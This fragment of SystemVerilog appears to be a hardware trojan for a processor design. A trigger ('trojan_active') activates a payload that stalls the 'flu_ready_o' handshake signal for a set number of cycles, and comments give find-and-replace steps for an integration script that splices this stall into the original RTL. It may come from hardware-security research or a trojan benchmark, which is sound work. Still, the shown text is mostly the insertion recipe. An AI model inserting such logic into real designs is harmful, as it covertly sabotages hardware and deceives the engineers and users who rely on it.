 ...
 * Payload: Delay flu_ready_o by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && flu_valid_o) begin
...
// ============================================================
// Performance Degradation: Delay flu_ready_o by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF flu_ready_o is a ready/valid signal:
//   Find: assign flu_ready_o = ready_condition;
//   Replace: assign flu_ready_o = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF flu_ready_o is in always_ff:
//   Find: flu_ready_o <= ready_value;
//   Replace: flu_ready_o <= (delay_counter == 0) ? ready_value : 1'b0;